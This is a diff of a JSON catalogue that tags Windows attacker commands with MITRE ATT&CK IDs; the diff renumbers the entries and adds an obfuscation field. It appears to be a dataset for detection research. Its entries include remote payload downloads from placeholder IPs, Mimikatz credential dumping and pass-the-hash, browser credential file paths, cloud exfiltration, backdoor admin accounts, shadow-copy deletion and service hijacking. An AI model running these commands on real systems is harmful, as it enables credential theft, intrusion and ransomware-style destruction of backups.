+        "ObfuscationLevel":null
     },
     {
-        "ID":2099,
+        "ID":165,
         "Command":"powershell.exe Start-BitsTransfer -Source http[:]\/\/<IP_address>\/pathto\/<file_name>.ext -Destination C:\\\\Users\\\\pathtofile\\\\<output_file>.ext -transfertype download",
         "Description":null,
         "RiskScore":null,
@@ -1812,10 +1976,11 @@
         "MitreAttackClassification":"T1197",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2100,
+        "ID":166,
         "Command":"sc.exe \\\\TARGET start <service_name>",
         "Description":null,
         "RiskScore":null,
@@ -1823,10 +1988,11 @@
         "MitreAttackClassification":"T1569.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2101,
+        "ID":167,
         "Command":"cmd.exe \/Q \/c esentutl.exe \/y",
         "Description":null,
         "RiskScore":null,
@@ -1834,10 +2000,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2102,
+        "ID":168,
         "Command":"**Google Chrome**",
         "Description":null,
         "RiskScore":null,
@@ -1845,10 +2012,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2103,
+        "ID":169,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Bookmarks",
         "Description":null,
         "RiskScore":null,
@@ -1856,10 +2024,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2104,
+        "ID":170,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Cookies",
         "Description":null,
         "RiskScore":null,
@@ -1867,10 +2036,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2105,
+        "ID":171,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Login Data",
         "Description":null,
         "RiskScore":null,
@@ -1878,10 +2048,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2106,
+        "ID":172,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Web Data",
         "Description":null,
         "RiskScore":null,
@@ -1889,10 +2060,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2107,
+        "ID":173,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Web Data-journal",
         "Description":null,
         "RiskScore":null,
@@ -1900,10 +2072,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2108,
+        "ID":174,
         "Command":"$user\\$appdata\\Google\\Chrome\\User Data\\Local State",
         "Description":null,
         "RiskScore":null,
@@ -1911,10 +2084,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2109,
+        "ID":175,
         "Command":"",
         "Description":null,
         "RiskScore":null,
@@ -1922,10 +2096,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2110,
+        "ID":176,
         "Command":"**Mozilla Firefox**",
         "Description":null,
         "RiskScore":null,
@@ -1933,10 +2108,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2111,
+        "ID":177,
         "Command":"$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\cookies",
         "Description":null,
         "RiskScore":null,
@@ -1944,10 +2120,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2112,
+        "ID":178,
         "Command":"$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\key3.db",
         "Description":null,
         "RiskScore":null,
@@ -1955,10 +2132,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2113,
+        "ID":179,
         "Command":"$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\key4.db",
         "Description":null,
         "RiskScore":null,
@@ -1966,10 +2144,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2114,
+        "ID":180,
         "Command":"$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\logins.json",
         "Description":null,
         "RiskScore":null,
@@ -1977,10 +2156,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2115,
+        "ID":181,
         "Command":"$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\places.sqlite",
         "Description":null,
         "RiskScore":null,
@@ -1988,10 +2168,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2116,
+        "ID":182,
         "Command":"",
         "Description":null,
         "RiskScore":null,
@@ -1999,10 +2180,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2117,
+        "ID":183,
         "Command":"**Opera**",
         "Description":null,
         "RiskScore":null,
@@ -2010,10 +2192,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2118,
+        "ID":184,
         "Command":"$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Bookmarks",
         "Description":null,
         "RiskScore":null,
@@ -2021,10 +2204,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2119,
+        "ID":185,
         "Command":"$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Cookies",
         "Description":null,
         "RiskScore":null,
@@ -2032,10 +2216,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2120,
+        "ID":186,
         "Command":"$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Login Data",
         "Description":null,
         "RiskScore":null,
@@ -2043,10 +2228,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2121,
+        "ID":187,
         "Command":"$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Web Data",
         "Description":null,
         "RiskScore":null,
@@ -2054,10 +2240,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2122,
+        "ID":188,
         "Command":"$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\Local State",
         "Description":null,
         "RiskScore":null,
@@ -2065,10 +2252,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2123,
+        "ID":189,
         "Command":"$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Bookmarks",
         "Description":null,
         "RiskScore":null,
@@ -2076,10 +2264,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2124,
+        "ID":190,
         "Command":"$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Cookies",
         "Description":null,
         "RiskScore":null,
@@ -2087,10 +2276,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2125,
+        "ID":191,
         "Command":"$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Login Data",
         "Description":null,
         "RiskScore":null,
@@ -2098,10 +2288,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2126,
+        "ID":192,
         "Command":"$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Web Data",
         "Description":null,
         "RiskScore":null,
@@ -2109,10 +2300,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2127,
+        "ID":193,
         "Command":"$user\\$appdata\\Opera\\Opera Next\\User Data\\Local State",
         "Description":null,
         "RiskScore":null,
@@ -2120,10 +2312,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2128,
+        "ID":194,
         "Command":"",
         "Description":null,
         "RiskScore":null,
@@ -2131,10 +2324,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2129,
+        "ID":195,
         "Command":"**Microsoft Edge**",
         "Description":null,
         "RiskScore":null,
@@ -2142,10 +2336,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2130,
+        "ID":196,
         "Command":"$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Bookmarks",
         "Description":null,
         "RiskScore":null,
@@ -2153,10 +2348,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2131,
+        "ID":197,
         "Command":"$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Cookies",
         "Description":null,
         "RiskScore":null,
@@ -2164,10 +2360,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2132,
+        "ID":198,
         "Command":"$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Login Data",
         "Description":null,
         "RiskScore":null,
@@ -2175,10 +2372,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2133,
+        "ID":199,
         "Command":"$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Web Data",
         "Description":null,
         "RiskScore":null,
@@ -2186,10 +2384,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2134,
+        "ID":200,
         "Command":"$user\\$appdata\\Microsoft\\Edge\\User Data\\Local State",
         "Description":null,
         "RiskScore":null,
@@ -2197,10 +2396,11 @@
         "MitreAttackClassification":"T1555.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2135,
+        "ID":201,
         "Command":"gwmi",
         "Description":null,
         "RiskScore":null,
@@ -2208,10 +2408,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2136,
+        "ID":202,
         "Command":"Get-WmiObject -Query \u201cselect * from Win32_Service\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2219,10 +2420,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2137,
+        "ID":203,
         "Command":"Get-WmiObject -Class Win32_Service",
         "Description":null,
         "RiskScore":null,
@@ -2230,10 +2432,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2138,
+        "ID":204,
         "Command":"Get-CimInstance -ClassName Win32_ComputerSystem",
         "Description":null,
         "RiskScore":null,
@@ -2241,10 +2444,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2139,
+        "ID":205,
         "Command":"Get-WmiObject win32_processor",
         "Description":null,
         "RiskScore":null,
@@ -2252,10 +2456,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2140,
+        "ID":206,
         "Command":"Get-WmiObject CIM_PhysicalMemory",
         "Description":null,
         "RiskScore":null,
@@ -2263,10 +2468,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2141,
+        "ID":207,
         "Command":"Get-WmiObject \u2013ComputerName <host> \u2013Class Win32_ComputerSystem | Select-Object UserName",
         "Description":null,
         "RiskScore":null,
@@ -2274,10 +2480,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2142,
+        "ID":208,
         "Command":"wmic.exe os get \/FORMAT:\u201dhttp:\/\/<IP_address>:<port>\/ <file_name>.exe\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2285,10 +2492,11 @@
         "MitreAttackClassification":"T1047",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2143,
+        "ID":209,
         "Command":"powershell.exe Get-SystemDriver",
         "Description":null,
         "RiskScore":null,
@@ -2296,10 +2504,11 @@
         "MitreAttackClassification":"T1652",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2144,
+        "ID":210,
         "Command":"powershell.exe gsv",
         "Description":null,
         "RiskScore":null,
@@ -2307,10 +2516,11 @@
         "MitreAttackClassification":"T1007",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2145,
+        "ID":211,
         "Command":"powershell.exe Get-Service",
         "Description":null,
         "RiskScore":null,
@@ -2318,10 +2528,11 @@
         "MitreAttackClassification":"T1007",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2146,
+        "ID":212,
         "Command":"powershell.exe Get-CimInstance -ClassName Win32_Service",
         "Description":null,
         "RiskScore":null,
@@ -2329,10 +2540,11 @@
         "MitreAttackClassification":"T1007",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2147,
+        "ID":213,
         "Command":"sc query <service_name>",
         "Description":null,
         "RiskScore":null,
@@ -2340,10 +2552,11 @@
         "MitreAttackClassification":"T1007",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2148,
+        "ID":214,
         "Command":"<mimikatz>.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit > <output_file>.txt",
         "Description":null,
         "RiskScore":null,
@@ -2351,10 +2564,11 @@
         "MitreAttackClassification":"T1550.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2149,
+        "ID":215,
         "Command":"<mimikatz>.exe \"privilege::debug\" \"sekurlsa::pth \/user:<user> \/domain:<domain> \/ntlm:<hash>\" exit",
         "Description":null,
         "RiskScore":null,
@@ -2362,10 +2576,11 @@
         "MitreAttackClassification":"T1550.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2150,
+        "ID":216,
         "Command":"powershell.exe get-eventlog security",
         "Description":null,
         "RiskScore":null,
@@ -2373,10 +2588,11 @@
         "MitreAttackClassification":"T1654",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2151,
+        "ID":217,
         "Command":"powershell.exe -c \"get-eventlog 'Security'",
         "Description":null,
         "RiskScore":null,
@@ -2384,10 +2600,11 @@
         "MitreAttackClassification":"T1654",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2152,
+        "ID":218,
         "Command":"powershell.exe InvokeModule -module awscollector -awskey <key_value> -awssecret <aws_secret> -awss3bucket <domain> -awsregion <region> -handleSystems <target_host>",
         "Description":null,
         "RiskScore":null,
@@ -2395,10 +2612,11 @@
         "MitreAttackClassification":"T1567.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2153,
+        "ID":219,
         "Command":"rclone.exe copy \"\\\\SERVER.domain.name\\path\"",
         "Description":null,
         "RiskScore":null,
@@ -2406,10 +2624,11 @@
         "MitreAttackClassification":"T1567.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2154,
+        "ID":220,
         "Command":"\\postex_*",
         "Description":null,
         "RiskScore":null,
@@ -2417,10 +2636,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2155,
+        "ID":221,
         "Command":"\\postex_ssh_*",
         "Description":null,
         "RiskScore":null,
@@ -2428,10 +2648,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2156,
+        "ID":222,
         "Command":"\\status_*",
         "Description":null,
         "RiskScore":null,
@@ -2439,10 +2660,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2157,
+        "ID":223,
         "Command":"\\msagent_*",
         "Description":null,
         "RiskScore":null,
@@ -2450,10 +2672,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2158,
+        "ID":224,
         "Command":"\\MSSE-*",
         "Description":null,
         "RiskScore":null,
@@ -2461,10 +2684,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2159,
+        "ID":225,
         "Command":"\\*-server",
         "Description":null,
         "RiskScore":null,
@@ -2472,10 +2696,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2160,
+        "ID":226,
         "Command":"\\wkssvc*",
         "Description":null,
         "RiskScore":null,
@@ -2483,10 +2708,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2161,
+        "ID":227,
         "Command":"\\DserNamePipe*",
         "Description":null,
         "RiskScore":null,
@@ -2494,10 +2720,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2162,
+        "ID":228,
         "Command":"\\mojo.*",
         "Description":null,
         "RiskScore":null,
@@ -2505,10 +2732,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2163,
+        "ID":229,
         "Command":"\\spoolss_*",
         "Description":null,
         "RiskScore":null,
@@ -2516,10 +2744,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2164,
+        "ID":230,
         "Command":"\\srvsvc_*",
         "Description":null,
         "RiskScore":null,
@@ -2527,10 +2756,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2165,
+        "ID":231,
         "Command":"\\win_svc*",
         "Description":null,
         "RiskScore":null,
@@ -2538,10 +2768,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2166,
+        "ID":232,
         "Command":"\\ntsvcs*",
         "Description":null,
         "RiskScore":null,
@@ -2549,10 +2780,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2167,
+        "ID":233,
         "Command":"\\winsock",
         "Description":null,
         "RiskScore":null,
@@ -2560,10 +2792,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2168,
+        "ID":234,
         "Command":"\\UIA_PIPE",
         "Description":null,
         "RiskScore":null,
@@ -2571,10 +2804,11 @@
         "MitreAttackClassification":"T1559",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2169,
+        "ID":235,
         "Command":"net user sys <username> \/add",
         "Description":null,
         "RiskScore":null,
@@ -2582,10 +2816,11 @@
         "MitreAttackClassification":"T1136.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2170,
+        "ID":236,
         "Command":"net localgroup %AdmGroup% sys \/add",
         "Description":null,
         "RiskScore":null,
@@ -2593,10 +2828,11 @@
         "MitreAttackClassification":"T1136.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2171,
+        "ID":237,
         "Command":"net localgroup \"%RDPGroup%\" sys \/add",
         "Description":null,
         "RiskScore":null,
@@ -2604,10 +2840,11 @@
         "MitreAttackClassification":"T1021.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2172,
+        "ID":238,
         "Command":"netsh advfirewall firewall add rule name= \"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389",
         "Description":null,
         "RiskScore":null,
@@ -2615,10 +2852,11 @@
         "MitreAttackClassification":"T1021.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2173,
+        "ID":239,
         "Command":"wmic shadowcopy delete",
         "Description":null,
         "RiskScore":null,
@@ -2626,10 +2864,11 @@
         "MitreAttackClassification":"T1490",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2174,
+        "ID":240,
         "Command":"powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-WmiObject",
         "Description":null,
         "RiskScore":null,
@@ -2637,10 +2876,11 @@
         "MitreAttackClassification":"T1490",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2175,
+        "ID":241,
         "Command":"vssadmine delete shadows \/all \/quiet",
         "Description":null,
         "RiskScore":null,
@@ -2648,10 +2888,11 @@
         "MitreAttackClassification":"T1490",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2176,
+        "ID":242,
         "Command":"bcdedit \/set {default} recoveryenabled No",
         "Description":null,
         "RiskScore":null,
@@ -2659,10 +2900,11 @@
         "MitreAttackClassification":"T1490",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2177,
+        "ID":243,
         "Command":"bcdedit \/set {default} bootstatuspolicy ignoreallfailures",
         "Description":null,
         "RiskScore":null,
@@ -2670,10 +2912,11 @@
         "MitreAttackClassification":"T1490",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2178,
+        "ID":244,
         "Command":"wmic \/Node:localhost \/Namespace:\\\\remotepath Path AntiVirusProduct Get * \/Format:List",
         "Description":null,
         "RiskScore":null,
@@ -2681,10 +2924,11 @@
         "MitreAttackClassification":"T1518.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2179,
+        "ID":245,
         "Command":"sc query WinDefend",
         "Description":null,
         "RiskScore":null,
@@ -2692,10 +2936,11 @@
         "MitreAttackClassification":"T1518.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2180,
+        "ID":246,
         "Command":"Get-MpComputerStatus",
         "Description":null,
         "RiskScore":null,
@@ -2703,10 +2948,11 @@
         "MitreAttackClassification":"T1518.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2181,
+        "ID":247,
         "Command":"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<vulnerable_service_name>\" \/v ImagePath \/t REG_SZ \/d \"C:\\pathto\\<payload.ext>\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2714,10 +2960,11 @@
         "MitreAttackClassification":"T1601",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2182,
+        "ID":248,
